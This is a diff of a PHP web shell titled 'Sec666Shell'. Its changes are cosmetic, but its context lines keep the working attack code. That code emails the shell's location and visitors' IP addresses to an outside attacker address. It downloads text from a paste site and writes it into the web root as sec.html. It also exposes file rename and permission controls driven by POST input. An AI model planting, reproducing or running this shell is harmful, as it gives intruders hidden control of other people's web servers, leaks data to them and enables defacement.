@@ -4,7 +4,7 @@ header('Content-Type: text/html; charset=UTF-8');
 $boss = 'zsec@gmx.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $ip = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($boss, "Hacker Was Here... ", $ip, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+mail($boss, "Hacker Was Here ", $ip, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 $check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
 $text3 = file_get_contents('https://ghostbin.co/paste/oswh6/raw');
 $op3=fopen($check3, 'w');
@@ -20,7 +20,7 @@ $_POST[$key] = stripslashes($value);
 echo '<!DOCTYPE HTML>
 <link rel="shortcut icon" href="https://i.ibb.co/f0tgWnV/1579475764733.png">
 <head>
-<title>‌</title>
+<title>Sec666Shell</title>
 <link href="https://fonts.googleapis.com/css?family=Calligraffitti&display=swap" rel="stylesheet"> 
 <link href="https://fonts.googleapis.com/css?family=Federant&display=swap" rel="stylesheet">
 <style>
@@ -112,7 +112,7 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 }elseif($_POST['opt'] == 'rename'){
 if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo '<font color="green">✓</font></font><br><br/><font color="white"> Name Success Change </font><font color="green">✓</font><br><br/><br><br/>';
+echo '<font color="green">✓</font></font><font color="white"> Name Success Change </font><font color="green">✓</font><br><br/>';
 }else{
 echo '<font color="red">×</font><font color="white"> Name Cannot Change </font><font color="red">×</font><br><br/>';
 }
